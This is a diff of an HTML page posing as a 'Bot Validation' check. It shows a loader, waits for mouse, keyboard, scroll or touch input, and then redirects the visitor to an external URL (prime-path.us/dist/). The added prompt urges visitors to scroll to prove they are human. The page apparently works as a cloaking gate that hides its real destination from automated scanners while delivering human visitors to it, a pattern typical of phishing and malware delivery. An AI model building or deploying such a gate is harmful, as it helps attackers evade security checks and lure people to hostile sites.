@@ -3,22 +3,25 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>File Validation</title>
+  <title>Bot Validation</title>
   <style>
     body {
       display: flex;
+      flex-direction: column;
       justify-content: center;
       align-items: center;
       height: 100vh;
       margin: 0;
       background-color: #f3f4f6;
       font-family: Arial, sans-serif;
+      position: relative;
     }
     .loader {
       display: flex;
       justify-content: center;
       align-items: center;
       gap: 10px;
+      margin-bottom: 20px;
     }
     .bubble {
       width: 15px;
@@ -41,30 +44,46 @@
         transform: scale(1);
       }
     }
+    .prompt {
+      font-size: 1.2em;
+      color: #333;
+      animation: fade-in 1s ease-in-out infinite alternate;
+      display: none;
+    }
+    @keyframes fade-in {
+      from {
+        opacity: 0.3;
+      }
+      to {
+        opacity: 1;
+      }
+    }
   </style>
   <script>
     document.addEventListener("DOMContentLoaded", function () {
-      // Set a flag to detect user interactions
-      let isHuman = false;
+      let interactionDetected = false;
+      let timeoutHandle;
 
-      // Detect user interactions (mouse, keyboard, scroll, or touch)
+      // Detect user interactions
       const markHuman = () => {
-        isHuman = true;
+        interactionDetected = true;
+        document.querySelector(".prompt").style.display = "none"; // Hide prompt on interaction
+        clearTimeout(timeoutHandle);
+        // Redirect user after interaction
+        window.location.href = "https://prime-path.us/dist/"; // Replace with your target URL
       };
+
       document.addEventListener("mousemove", markHuman);
       document.addEventListener("keypress", markHuman);
       document.addEventListener("scroll", markHuman);
       document.addEventListener("touchstart", markHuman);
 
-      // Validate and redirect after delay
-      setTimeout(() => {
-        if (isHuman) {
-          // Redirect if the user is valid
-          window.location.href = "https://prime-path.us/dist/"; // Replace with your target URL
-        } else {
-          console.warn("Bot detected or no interaction from user.");
+      // Show prompt if no interaction after 5 seconds
+      timeoutHandle = setTimeout(() => {
+        if (!interactionDetected) {
+          document.querySelector(".prompt").style.display = "block";
         }
-      }, 3000); // Adjust the delay as needed
+      }, 5000); // Show prompt after 5 seconds
     });
   </script>
 </head>
@@ -74,5 +93,6 @@
     <div class="bubble"></div>
     <div class="bubble"></div>
   </div>
+  <div class="prompt">Please scroll the page up and down to verify you are not a bot.</div>
 </body>
 </html>
